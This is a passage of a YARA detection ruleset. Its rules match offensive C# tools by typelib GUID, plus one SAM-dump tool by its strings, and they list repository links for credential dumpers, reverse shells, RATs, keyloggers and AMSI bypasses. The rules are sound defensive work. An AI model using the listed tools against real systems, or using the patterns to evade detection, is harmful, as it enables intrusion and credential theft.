versions\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-09-29\"\n\t\tscore = 80\n\t\thash1 = \"2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa\"\n\t\thash2 = \"87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f\"\n\t\thash3 = \"a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9\"\n\t\thash4 = \"c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab\"\n\t\thash5 = \"677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa\"\n\t\thash6 = \"d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674\"\n\t\thash7 = \"8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819\"\n\tstrings:\n\t\t$s1 = \"OpenProcessToken() error: 0x%08X\" fullword ascii\n\t\t$s2 = \"%d dumped\" fullword ascii\n\t\t$s3 = \"AdjustTokenPrivileges() error: 0x%08X\" fullword ascii\n\t\t$s4 = \"\\\\SAM-%u.dmp\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or\n    organization, as long as you use it under this license.\n*/\n\n\n// These rules have room for false positives if e.g. a dual use tool is contained within a hack tool repo.\n// Could also be done with https://yara.readthedocs.io/en/stable/modules/dotnet.html#c.typelib but that needs an extra module.\n\n\nrule HKTL_NET_GUID_CSharpSetThreadContext {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/CSharpSetThreadContext\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a1e28c8c-b3bd-44de-85b9-8aa7c18a714d\" ascii nocase wide\n        $typelibguid1 = \"87c5970e-0c77-4182-afe2-3fe96f785ebb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DLL_Injection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ihack4falafel/DLL-Injection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3d7e1433-f81a-428a-934f-7cc7fcf1149d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LimeUSB_Csharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/LimeUSB-Csharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"94ea43ab-7878-4048-a64e-2b21b3b4366d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Ladon {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/k8gege/Ladon\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c335405f-5df2-4c7d-9b53-d65adfbed412\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WhiteListEvasion {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/khr0x40sh/WhiteListEvasion\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"858386df-4656-4a1e-94b7-47f6aa555658\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_Downloader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Downloader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ec7afd4c-fbc4-47c1-99aa-6ebb05094173\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DarkEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/K1ngSoul/DarkEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0bdb9c65-14ed-4205-ab0c-ea2151866a7f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpKatz {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpKatz\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8568b4c1-2940-4f6c-bf4e-4383ef268be9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ExternalC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ryhanson/ExternalC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7266acbb-b10d-4873-9b99-12d2043b1d4e\" ascii nocase wide\n        $typelibguid1 = \"5d9515d0-df67-40ed-a6b2-6619620ef0ef\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Povlsomware {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/povlteksttv/Povlsomware\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe0d5aa7-538f-42f6-9ece-b141560f7781\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RunShellcode {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/zerosum0x0/RunShellcode\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a3ec18a3-674c-4131-a7f5-acbed034b819\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpLoginPrompt {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shantanu561993/SharpLoginPrompt\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c12e69cd-78a0-4960-af7e-88cbd794af97\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Adamantium_Thief {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/Adamantium-Thief\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"e6104bc9-fea9-4ee9-b919-28156c1f2ede\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PSByPassCLM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/PSByPassCLM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"46034038-0113-4d75-81fd-eb3b483f2662\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_physmem2profit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/physmem2profit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"814708c9-2320-42d2-a45f-31e42da06a94\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_NoAmci {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/med0x2e/NoAmci\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"352e80ec-72a5-4aa6-aabe-4f9a20393e8e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpBlock {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/CCob/SharpBlock\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3cf25e04-27e4-4d19-945e-dadc37c81152\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_nopowershell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/bitsadmin/nopowershell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"555ad0ac-1fdb-4016-8257-170a74cb2f55\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LimeLogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/LimeLogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"068d14ef-f0a1-4f9d-8e27-58b4317830c6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AggressorScripts {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/harleyQu1nn/AggressorScripts\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"afd1ff09-2632-4087-a30c-43591f32e4e8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Gopher {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/EncodeGroup/Gopher\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"b5152683-2514-49ce-9aca-1bc43df1e234\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AVIator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Ch0pin/AVIator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4885a4a3-4dfa-486c-b378-ae94a221661a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_njCrypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xPh0enix/njCrypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8a87b003-4b43-467b-a509-0c8be05bf5a5\" ascii nocase wide\n        $typelibguid1 = \"80b13bff-24a5-4193-8e51-c62a414060ec\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpMiniDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpMiniDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6ffccf81-6c3c-4d3f-b15f-35a86d0b497f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CinaRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/wearelegal/CinaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8586f5b1-2ef4-4f35-bd45-c6206fdc0ebc\" ascii nocase wide\n        $typelibguid1 = \"fe184ab5-f153-4179-9bf5-50523987cf1f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ToxicEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/ToxicEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1bcfe538-14f4-4beb-9a3f-3f9472794902\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Disable_Windows_Defender {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Disable-Windows-Defender\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"501e3fdc-575d-492e-90bc-703fb6280ee2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DInvoke_PoC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/dtrizna/DInvoke_PoC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5a869ab2-291a-49e6-a1b7-0d0f051bef0e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ReverseShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/chango77747/ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"980109e4-c988-47f9-b2b3-88d63fababdc\" ascii nocase wide\n        $typelibguid1 = \"8abe8da1-457e-4933-a40d-0958c8925985\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SharpC2/SharpC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"62b9ee4f-1436-4098-9bc1-dd61b42d8b81\" ascii nocase wide\n        $typelibguid1 = \"d2f17a91-eb2d-4373-90bf-a26e46c68f76\" ascii nocase wide\n        $typelibguid2 = \"a9db9fcc-7502-42cd-81ec-3cd66f511346\" ascii nocase wide\n        $typelibguid3 = \"ca6cc2ee-75fd-4f00-b687-917fa55a4fae\" ascii nocase wide\n        $typelibguid4 = \"a1167b68-446b-4c0c-a8b8-2a7278b67511\" ascii nocase wide\n        $typelibguid5 = \"4d8c2a88-1da5-4abe-8995-6606473d7cf1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SneakyExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HackingThings/SneakyExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"612590aa-af68-41e6-8ce2-e831f7fe4ccc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UrbanBishopLocal {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/UrbanBishopLocal\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"88b8515e-a0e8-4208-a9a0-34b01d7ba533\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cobbr/SharpShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"bdba47c5-e823-4404-91d0-7f6561279525\" ascii nocase wide\n        $typelibguid1 = \"b84548dc-d926-4b39-8293-fa0bdef34d49\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EvilWMIProvider {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/sunnyc7/EvilWMIProvider\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a4020626-f1ec-4012-8b17-a2c8a0204a4b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_GadgetToJScript {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/med0x2e/GadgetToJScript\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"af9c62a1-f8d2-4be0-b019-0a7873e81ea9\" ascii nocase wide\n        $typelibguid1 = \"b2b3adb0-1669-4b94-86cb-6dd682ddbea3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AzureCLI_Extractor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0x09AL/AzureCLI-Extractor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a73cad74-f8d6-43e6-9a4c-b87832cdeace\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UAC_Escaper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/UAC-Escaper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"95359279-5cfa-46f6-b400-e80542a7336a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HTTPSBeaconShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/limbenjamin/HTTPSBeaconShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"aca853dc-9e74-4175-8170-e85372d5f2a9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AmsiScanBufferBypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/AmsiScanBufferBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"431ef2d9-5cca-41d3-87ba-c7f5e4582dd2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ShellcodeLoader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Hzllaga/ShellcodeLoader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a48fe0e1-30de-46a6-985a-3f2de3c8ac96\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_KeystrokeAPI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fabriciorissetto/KeystrokeAPI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f6fec17e-e22d-4149-a8a8-9f64c3c905d3\" ascii nocase wide\n        $typelibguid1 = \"b7aa4e23-39a4-49d5-859a-083c789bfea2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ShellCodeRunner {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/antman1p/ShellCodeRunner\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"634874b7-bf85-400c-82f0-7f3b4659549a\" ascii nocase wide\n        $typelibguid1 = \"2f9c3053-077f-45f2-b207-87c3c7b8f054\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_OffensiveCSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/diljith369/OffensiveCSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6c3fbc65-b673-40f0-b1ac-20636df01a85\" ascii nocase wide\n        $typelibguid1 = \"2bad9d69-ada9-4f1e-b838-9567e1503e93\" ascii nocase wide\n        $typelibguid2 = \"512015de-a70f-4887-8eae-e500fd2898ab\" ascii nocase wide\n        $typelibguid3 = \"1ee4188c-24ac-4478-b892-36b1029a13b3\" ascii nocase wide\n        $typelibguid4 = \"5c6b7361-f9ab-41dc-bfa0-ed5d4b0032a8\" ascii nocase wide\n        $typelibguid5 = \"048a6559-d4d3-4ad8-af0f-b7f72b212e90\" ascii nocase wide\n        $typelibguid6 = \"3412fbe9-19d3-41d8-9ad2-6461fcb394dc\" ascii nocase wide\n        $typelibguid7 = \"9ea4e0dc-9723-4d93-85bb-a4fcab0ad210\" ascii nocase wide\n        $typelibguid8 = \"6d2b239c-ba1e-43ec-8334-d67d52b77181\" ascii nocase wide\n        $typelibguid9 = \"42e8b9e1-0cf4-46ae-b573-9d0563e41238\" ascii nocase wide\n        $typelibguid10 = \"0d15e0e3-bcfd-4a85-adcd-0e751dab4dd6\" ascii nocase wide\n        $typelibguid11 = \"644dfd1a-fda5-4948-83c2-8d3b5eda143a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SHAPESHIFTER {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/matterpreter/SHAPESHIFTER\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a3ddfcaa-66e7-44fd-ad48-9d80d1651228\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Evasor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cyberark/Evasor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1c8849ef-ad09-4727-bf81-1f777bd1aef8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Stracciatella {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mgeeky/Stracciatella\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"eaafa0ac-e464-4fc4-9713-48aa9a6716fb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_logger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/xxczaki/logger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9e92a883-3c8b-4572-a73e-bb3e61cfdc16\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Internal_Monologue {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/eladshamir/Internal-Monologue\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0c0333db-8f00-4b68-b1db-18a9cacc1486\" ascii nocase wide\n        $typelibguid1 = \"84701ace-c584-4886-a3cf-76c57f6e801a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_GRAT2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/GRAT2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5e7fce78-1977-444f-a18e-987d708a2cff\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PowerShdll {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/p3nt4/PowerShdll\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"36ebf9aa-2f37-4f1d-a2f1-f2a45deeaf21\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CsharpAmsiBypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/WayneJLee/CsharpAmsiBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4ab3b95d-373c-4197-8ee3-fe0fa66ca122\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HastySeries {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/obscuritylabs/HastySeries\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8435531d-675c-4270-85bf-60db7653bcf6\" ascii nocase wide\n        $typelibguid1 = \"47db989f-7e33-4e6b-a4a5-c392b429264b\" ascii nocase wide\n        $typelibguid2 = \"300c7489-a05f-4035-8826-261fa449dd96\" ascii nocase wide\n        $typelibguid3 = \"41bf8781-ae04-4d80-b38d-707584bf796b\" ascii nocase wide\n        $typelibguid4 = \"620ed459-18de-4359-bfb0-6d0c4841b6f6\" ascii nocase wide\n        $typelibguid5 = \"91e7cdfe-0945-45a7-9eaa-0933afe381f2\" ascii nocase wide\n        $typelibguid6 = \"c28e121a-60ca-4c21-af4b-93eb237b882f\" ascii nocase wide\n        $typelibguid7 = \"698fac7a-bff1-4c24-b2c3-173a6aae15bf\" ascii nocase wide\n        $typelibguid8 = \"63a40d94-5318-42ad-a573-e3a1c1284c57\" ascii nocase wide\n        $typelibguid9 = \"56b8311b-04b8-4e57-bb58-d62adc0d2e68\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DreamProtectorFree {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Paskowsky/DreamProtectorFree\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f7e8a902-2378-426a-bfa5-6b14c4b40aa3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RedSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/RedSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = 